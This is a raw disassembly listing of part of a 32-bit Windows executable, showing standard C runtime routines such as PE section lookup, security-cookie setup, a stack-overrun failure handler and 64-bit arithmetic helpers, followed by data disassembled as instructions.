  405f98:	mov    ecx,DWORD PTR [eax+0x3c]
  405f9b:	add    ecx,eax
  405f9d:	movzx  eax,WORD PTR [ecx+0x14]
  405fa1:	push   ebx
  405fa2:	movzx  ebx,WORD PTR [ecx+0x6]
  405fa6:	add    eax,0x18
  405fa9:	push   esi
  405faa:	xor    edx,edx
  405fac:	add    eax,ecx
  405fae:	push   edi
  405faf:	test   ebx,ebx
  405fb1:	je     0x405fce
  405fb3:	mov    edi,DWORD PTR [ebp+0xc]
  405fb6:	mov    esi,DWORD PTR [eax+0xc]
  405fb9:	cmp    edi,esi
  405fbb:	jb     0x405fc6
  405fbd:	mov    ecx,DWORD PTR [eax+0x8]
  405fc0:	add    ecx,esi
  405fc2:	cmp    edi,ecx
  405fc4:	jb     0x405fd0
  405fc6:	inc    edx
  405fc7:	add    eax,0x28
  405fca:	cmp    edx,ebx
  405fcc:	jb     0x405fb6
  405fce:	xor    eax,eax
  405fd0:	pop    edi
  405fd1:	pop    esi
  405fd2:	pop    ebx
  405fd3:	pop    ebp
  405fd4:	ret    
  405fd5:	int3   
  405fd6:	int3   
  405fd7:	int3   
  405fd8:	int3   
  405fd9:	int3   
  405fda:	int3   
  405fdb:	int3   
  405fdc:	int3   
  405fdd:	int3   
  405fde:	int3   
  405fdf:	int3   
  405fe0:	int3   
  405fe1:	int3   
  405fe2:	int3   
  405fe3:	int3   
  405fe4:	int3   
  405fe5:	int3   
  405fe6:	int3   
  405fe7:	int3   
  405fe8:	int3   
  405fe9:	int3   
  405fea:	int3   
  405feb:	int3   
  405fec:	int3   
  405fed:	int3   
  405fee:	int3   
  405fef:	int3   
  405ff0:	int3   
  405ff1:	int3   
  405ff2:	int3   
  405ff3:	int3   
  405ff4:	int3   
  405ff5:	int3   
  405ff6:	int3   
  405ff7:	int3   
  405ff8:	int3   
  405ff9:	int3   
  405ffa:	int3   
  405ffb:	int3   
  405ffc:	int3   
  405ffd:	int3   
  405ffe:	int3   
  405fff:	int3   
  406000:	mov    edi,edi
  406002:	push   ebp
  406003:	mov    ebp,esp
  406005:	push   0xfffffffe
  406007:	push   0x406478
  40600c:	push   0x405b0c
  406011:	mov    eax,fs:0x0
  406017:	push   eax
  406018:	sub    esp,0x8
  40601b:	push   ebx
  40601c:	push   esi
  40601d:	push   edi
  40601e:	mov    eax,ds:0x407a10
  406023:	xor    DWORD PTR [ebp-0x8],eax
  406026:	xor    eax,ebp
  406028:	push   eax
  406029:	lea    eax,[ebp-0x10]
  40602c:	mov    fs:0x0,eax
  406032:	mov    DWORD PTR [ebp-0x18],esp
  406035:	mov    DWORD PTR [ebp-0x4],0x0
  40603c:	push   0x400000
  406041:	call   0x405f50
  406046:	add    esp,0x4
  406049:	test   eax,eax
  40604b:	je     0x4060a1
  40604d:	mov    eax,DWORD PTR [ebp+0x8]
  406050:	sub    eax,0x400000
  406055:	push   eax
  406056:	push   0x400000
  40605b:	call   0x405f90
  406060:	add    esp,0x8
  406063:	test   eax,eax
  406065:	je     0x4060a1
  406067:	mov    eax,DWORD PTR [eax+0x24]
  40606a:	shr    eax,0x1f
  40606d:	not    eax
  40606f:	and    eax,0x1
  406072:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406079:	mov    ecx,DWORD PTR [ebp-0x10]
  40607c:	mov    DWORD PTR fs:0x0,ecx
  406083:	pop    ecx
  406084:	pop    edi
  406085:	pop    esi
  406086:	pop    ebx
  406087:	mov    esp,ebp
  406089:	pop    ebp
  40608a:	ret    
  40608b:	mov    eax,DWORD PTR [ebp-0x14]
  40608e:	mov    eax,DWORD PTR [eax]
  406090:	xor    ecx,ecx
  406092:	cmp    DWORD PTR [eax],0xc0000005
  406098:	sete   cl
  40609b:	mov    eax,ecx
  40609d:	ret    
  40609e:	mov    esp,DWORD PTR [ebp-0x18]
  4060a1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4060a8:	xor    eax,eax
  4060aa:	mov    ecx,DWORD PTR [ebp-0x10]
  4060ad:	mov    DWORD PTR fs:0x0,ecx
  4060b4:	pop    ecx
  4060b5:	pop    edi
  4060b6:	pop    esi
  4060b7:	pop    ebx
  4060b8:	mov    esp,ebp
  4060ba:	pop    ebp
  4060bb:	ret    
  4060bc:	int3   
  4060bd:	int3   
  4060be:	int3   
  4060bf:	int3   
  4060c0:	int3   
  4060c1:	mov    edi,edi
  4060c3:	push   ebp
  4060c4:	mov    ebp,esp
  4060c6:	sub    esp,0x14
  4060c9:	mov    eax,ds:0x407a10
  4060ce:	and    DWORD PTR [ebp-0xc],0x0
  4060d2:	and    DWORD PTR [ebp-0x8],0x0
  4060d6:	push   esi
  4060d7:	push   edi
  4060d8:	mov    edi,0xbb40e64e
  4060dd:	mov    esi,0xffff0000
  4060e2:	cmp    eax,edi
  4060e4:	je     0x4060f3
  4060e6:	test   esi,eax
  4060e8:	je     0x4060f3
  4060ea:	not    eax
  4060ec:	mov    ds:0x407a14,eax
  4060f1:	jmp    0x40615d
  4060f3:	lea    eax,[ebp-0xc]
  4060f6:	push   eax
  4060f7:	call   DWORD PTR ds:0x4092bc
  4060fd:	mov    eax,DWORD PTR [ebp-0x8]
  406100:	xor    eax,DWORD PTR [ebp-0xc]
  406103:	mov    DWORD PTR [ebp-0x4],eax
  406106:	call   DWORD PTR ds:0x409290
  40610c:	xor    DWORD PTR [ebp-0x4],eax
  40610f:	call   DWORD PTR ds:0x4092c0
  406115:	xor    DWORD PTR [ebp-0x4],eax
  406118:	call   DWORD PTR ds:0x4092b8
  40611e:	xor    eax,DWORD PTR [ebp-0x4]
  406121:	lea    ecx,[ebp-0x4]
  406124:	xor    eax,ecx
  406126:	mov    DWORD PTR [ebp-0x4],eax
  406129:	lea    eax,[ebp-0x14]
  40612c:	push   eax
  40612d:	call   DWORD PTR ds:0x4092c4
  406133:	mov    eax,DWORD PTR [ebp-0x10]
  406136:	xor    eax,DWORD PTR [ebp-0x14]
  406139:	mov    ecx,DWORD PTR [ebp-0x4]
  40613c:	xor    ecx,eax
  40613e:	cmp    ecx,edi
  406140:	je     0x40614a
  406142:	test   DWORD PTR ds:0x407a10,esi
  406148:	jne    0x40614f
  40614a:	mov    ecx,0xbb40e64f
  40614f:	mov    DWORD PTR ds:0x407a10,ecx
  406155:	not    ecx
  406157:	mov    DWORD PTR ds:0x407a14,ecx
  40615d:	pop    edi
  40615e:	pop    esi
  40615f:	leave  
  406160:	ret    
  406161:	int3   
  406162:	int3   
  406163:	int3   
  406164:	int3   
  406165:	int3   
  406166:	xor    eax,eax
  406168:	ret    
  406169:	int3   
  40616a:	int3   
  40616b:	int3   
  40616c:	int3   
  40616d:	int3   
  40616e:	push   0x30000
  406173:	push   0x10000
  406178:	call   DWORD PTR ds:0x4093e4
  40617e:	pop    ecx
  40617f:	pop    ecx
  406180:	ret    
  406181:	int3   
  406182:	int3   
  406183:	int3   
  406184:	int3   
  406185:	int3   
  406186:	jmp    DWORD PTR ds:0x409410
  40618c:	int3   
  40618d:	int3   
  40618e:	int3   
  40618f:	int3   
  406190:	int3   
  406191:	mov    edi,edi
  406193:	push   ebp
  406194:	mov    ebp,esp
  406196:	sub    esp,0x324
  40619c:	mov    ds:0x407ed0,eax
  4061a1:	mov    DWORD PTR ds:0x407ecc,ecx
  4061a7:	mov    DWORD PTR ds:0x407ec8,edx
  4061ad:	mov    DWORD PTR ds:0x407ec4,ebx
  4061b3:	mov    DWORD PTR ds:0x407ec0,esi
  4061b9:	mov    DWORD PTR ds:0x407ebc,edi
  4061bf:	data16 mov WORD PTR ds:0x407ee8,ss
  4061c6:	data16 mov WORD PTR ds:0x407edc,cs
  4061cd:	data16 mov WORD PTR ds:0x407eb8,ds
  4061d4:	data16 mov WORD PTR ds:0x407eb4,es
  4061db:	data16 mov WORD PTR ds:0x407eb0,fs
  4061e2:	data16 mov WORD PTR ds:0x407eac,gs
  4061e9:	pushf  
  4061ea:	pop    DWORD PTR ds:0x407ee0
  4061f0:	mov    eax,DWORD PTR [ebp+0x0]
  4061f3:	mov    ds:0x407ed4,eax
  4061f8:	mov    eax,DWORD PTR [ebp+0x4]
  4061fb:	mov    ds:0x407ed8,eax
  406200:	lea    eax,[ebp+0x8]
  406203:	mov    ds:0x407ee4,eax
  406208:	mov    eax,DWORD PTR [ebp-0x324]
  40620e:	mov    DWORD PTR ds:0x407e20,0x10001
  406218:	mov    eax,ds:0x407ed8
  40621d:	mov    ds:0x407ddc,eax
  406222:	mov    DWORD PTR ds:0x407dd0,0xc0000409
  40622c:	mov    DWORD PTR ds:0x407dd4,0x1
  406236:	mov    DWORD PTR ds:0x407de0,0x3
  406240:	mov    DWORD PTR ds:0x407de4,0x2
  40624a:	mov    eax,ds:0x407a10
  40624f:	mov    ds:0x407de8,eax
  406254:	mov    eax,ds:0x407a14
  406259:	mov    ds:0x407dec,eax
  40625e:	mov    eax,ds:0x407a10
  406263:	mov    DWORD PTR [ebp-0x8],eax
  406266:	mov    eax,ds:0x407a14
  40626b:	mov    DWORD PTR [ebp-0x4],eax
  40626e:	push   0x4021f0
  406273:	call   0x40627f
  406278:	leave  
  406279:	ret    
  40627a:	int3   
  40627b:	int3   
  40627c:	int3   
  40627d:	int3   
  40627e:	int3   
  40627f:	mov    edi,edi
  406281:	push   ebp
  406282:	mov    ebp,esp
  406284:	push   0x0
  406286:	call   DWORD PTR ds:0x4092cc
  40628c:	push   DWORD PTR [ebp+0x8]
  40628f:	call   DWORD PTR ds:0x4092b4
  406295:	push   0xc0000409
  40629a:	call   DWORD PTR ds:0x4092b0
  4062a0:	push   eax
  4062a1:	call   DWORD PTR ds:0x4092ac
  4062a7:	pop    ebp
  4062a8:	ret    
  4062a9:	int3   
  4062aa:	int3   
  4062ab:	int3   
  4062ac:	int3   
  4062ad:	int3   
  4062ae:	int3   
  4062af:	int3   
  4062b0:	push   esi
  4062b1:	mov    eax,DWORD PTR [esp+0x14]
  4062b5:	or     eax,eax
  4062b7:	jne    0x4062e1
  4062b9:	mov    ecx,DWORD PTR [esp+0x10]
  4062bd:	mov    eax,DWORD PTR [esp+0xc]
  4062c1:	xor    edx,edx
  4062c3:	div    ecx
  4062c5:	mov    ebx,eax
  4062c7:	mov    eax,DWORD PTR [esp+0x8]
  4062cb:	div    ecx
  4062cd:	mov    esi,eax
  4062cf:	mov    eax,ebx
  4062d1:	mul    DWORD PTR [esp+0x10]
  4062d5:	mov    ecx,eax
  4062d7:	mov    eax,esi
  4062d9:	mul    DWORD PTR [esp+0x10]
  4062dd:	add    edx,ecx
  4062df:	jmp    0x406328
  4062e1:	mov    ecx,eax
  4062e3:	mov    ebx,DWORD PTR [esp+0x10]
  4062e7:	mov    edx,DWORD PTR [esp+0xc]
  4062eb:	mov    eax,DWORD PTR [esp+0x8]
  4062ef:	shr    ecx,1
  4062f1:	rcr    ebx,1
  4062f3:	shr    edx,1
  4062f5:	rcr    eax,1
  4062f7:	or     ecx,ecx
  4062f9:	jne    0x4062ef
  4062fb:	div    ebx
  4062fd:	mov    esi,eax
  4062ff:	mul    DWORD PTR [esp+0x14]
  406303:	mov    ecx,eax
  406305:	mov    eax,DWORD PTR [esp+0x10]
  406309:	mul    esi
  40630b:	add    edx,ecx
  40630d:	jb     0x40631d
  40630f:	cmp    edx,DWORD PTR [esp+0xc]
  406313:	ja     0x40631d
  406315:	jb     0x406326
  406317:	cmp    eax,DWORD PTR [esp+0x8]
  40631b:	jbe    0x406326
  40631d:	dec    esi
  40631e:	sub    eax,DWORD PTR [esp+0x10]
  406322:	sbb    edx,DWORD PTR [esp+0x14]
  406326:	xor    ebx,ebx
  406328:	sub    eax,DWORD PTR [esp+0x8]
  40632c:	sbb    edx,DWORD PTR [esp+0xc]
  406330:	neg    edx
  406332:	neg    eax
  406334:	sbb    edx,0x0
  406337:	mov    ecx,edx
  406339:	mov    edx,ebx
  40633b:	mov    ebx,ecx
  40633d:	mov    ecx,eax
  40633f:	mov    eax,esi
  406341:	pop    esi
  406342:	ret    0x10
  406345:	int3   
  406346:	int3   
  406347:	int3   
  406348:	int3   
  406349:	int3   
  40634a:	int3   
  40634b:	int3   
  40634c:	push   ebx
  40634d:	push   ecx
  40634e:	mov    ebx,0x407a30
  406353:	jmp    0x406360
  406355:	push   ebx
  406356:	push   ecx
  406357:	mov    ebx,0x407a30
  40635c:	mov    ecx,DWORD PTR [esp+0xc]
  406360:	mov    DWORD PTR [ebx+0x8],ecx
  406363:	mov    DWORD PTR [ebx+0x4],eax
  406366:	mov    DWORD PTR [ebx+0xc],ebp
  406369:	push   ebp
  40636a:	push   ecx
  40636b:	push   eax
  40636c:	pop    eax
  40636d:	pop    ecx
  40636e:	pop    ebp
  40636f:	pop    ecx
  406370:	pop    ebx
  406371:	ret    0x4
  406374:	call   eax
  406376:	ret    
  406377:	int3   
  406378:	int3   
  406379:	int3   
  40637a:	int3   
  40637b:	int3   
  40637c:	int3   
  40637d:	int3   
  40637e:	int3   
  40637f:	int3   
  406380:	mov    eax,DWORD PTR [esp+0x8]
  406384:	mov    ecx,DWORD PTR [esp+0x10]
  406388:	or     ecx,eax
  40638a:	mov    ecx,DWORD PTR [esp+0xc]
  40638e:	jne    0x406399
  406390:	mov    eax,DWORD PTR [esp+0x4]
  406394:	mul    ecx
  406396:	ret    0x10
  406399:	push   ebx
  40639a:	mul    ecx
  40639c:	mov    ebx,eax
  40639e:	mov    eax,DWORD PTR [esp+0x8]
  4063a2:	mul    DWORD PTR [esp+0x14]
  4063a6:	add    ebx,eax
  4063a8:	mov    eax,DWORD PTR [esp+0x8]
  4063ac:	mul    ecx
  4063ae:	add    edx,ebx
  4063b0:	pop    ebx
  4063b1:	ret    0x10
  4063b4:	int3   
  4063b5:	int3   
  4063b6:	int3   
  4063b7:	int3   
  4063b8:	int3   
  4063b9:	int3   
  4063ba:	jmp    DWORD PTR ds:0x4092f4
  4063c0:	int3   
  4063c1:	int3   
  4063c2:	int3   
  4063c3:	int3   
  4063c4:	int3   
  4063c5:	int3   
  4063c6:	jmp    DWORD PTR ds:0x4092f8
  4063cc:	int3   
  4063cd:	int3   
  4063ce:	int3   
  4063cf:	int3   
  4063d0:	int3   
  4063d1:	int3   
  4063d2:	jmp    DWORD PTR ds:0x4092d0
  4063d8:	(bad)  
  4063d9:	(bad)  
  4063da:	(bad)  
  4063db:	inc    DWORD PTR [eax]
  4063dd:	add    BYTE PTR [eax],al
  4063df:	add    al,bl
  4063e1:	(bad)  
  4063e2:	(bad)  
  4063e3:	inc    DWORD PTR [eax]
  4063e5:	add    BYTE PTR [eax],al
  4063e7:	add    dh,bh
  4063e9:	(bad)  
  4063ea:	(bad)  
  4063eb:	jmp    FWORD PTR [ebx+eax*2+0x40]
  4063ef:	add    BYTE PTR [ecx+0x43],bh
  4063f2:	inc    eax
  4063f3:	add    BYTE PTR [eax],al
  4063f5:	add    BYTE PTR [eax],al
  4063f7:	add    ah,ah
  4063f9:	(bad)  
  4063fa:	(bad)  
  4063fb:	inc    DWORD PTR [eax]
  4063fd:	add    BYTE PTR [eax],al
  4063ff:	add    BYTE PTR [eax+0xffffff],dl
  406405:	add    BYTE PTR [eax],al
  406407:	add    dh,bh
  406409:	(bad)  
  40640a:	(bad)  
  40640b:	jmp    DWORD PTR [ebp-0x4dffbfac]
  406411:	push   esp
  406412:	inc    eax
  406413:	add    dh,bh
  406415:	(bad)  
  406416:	(bad)  
  406417:	(bad)  
  406418:	jp     0x40646e
  40641a:	inc    eax
  40641b:	add    BYTE PTR [edi-0x1ffbfac],al
  406421:	(bad)  
  406422:	(bad)  
  406423:	inc    DWORD PTR [eax]
  406425:	push   esp
  406426:	inc    eax
  406427:	add    BYTE PTR ds:0x4054,cl
  40642d:	add    BYTE PTR [eax],al
  40642f:	add    dh,bh
  406431:	(bad)  
  406432:	(bad)  
  406433:	inc    DWORD PTR [eax]
  406435:	add    BYTE PTR [eax],al
  406437:	add    BYTE PTR [eax+0xffffff],cl
  40643d:	add    BYTE PTR [eax],al
  40643f:	add    dh,bh
  406441:	(bad)  
  406442:	(bad)  
  406443:	dec    DWORD PTR ds:0x1100405a
  406449:	pop    edx
  40644a:	inc    eax
  40644b:	add    dh,bh
  40644d:	(bad)  
  40644e:	(bad)  
  40644f:	inc    ecx
  406451:	pop    ecx
  406452:	inc    eax
  406453:	add    ch,dl
  406455:	pop    ecx
  406456:	inc    eax
  406457:	add    dh,bh
  406459:	(bad)  
  40645a:	(bad)  
  40645b:	inc    DWORD PTR [eax]
  40645d:	add    BYTE PTR [eax],al
  40645f:	add    ah,dl
  406461:	(bad)  
  406462:	(bad)  
  406463:	inc    DWORD PTR [eax]
  406465:	add    BYTE PTR [eax],al
  406467:	add    dh,bh
  406469:	(bad)  
  40646a:	(bad)  
  40646b:	(bad)  
  40646c:	fistp  WORD PTR [esi+0x40]
  40646f:	add    bl,ah
  406471:	pop    esi
  406472:	inc    eax
  406473:	add    BYTE PTR [eax],al
  406475:	add    BYTE PTR [eax],al
  406477:	add    dh,bh
  406479:	(bad)  
  40647a:	(bad)  
  40647b:	inc    DWORD PTR [eax]
  40647d:	add    BYTE PTR [eax],al
  40647f:	add    al,bl
  406481:	(bad)  
  406482:	(bad)  
  406483:	inc    DWORD PTR [eax]
  406485:	add    BYTE PTR [eax],al
  406487:	add    dh,bh
  406489:	(bad)  
  40648a:	(bad)  
  40648b:	dec    DWORD PTR [ebx-0x61ffbfa0]
  406491:	pusha  
  406492:	inc    eax
	...
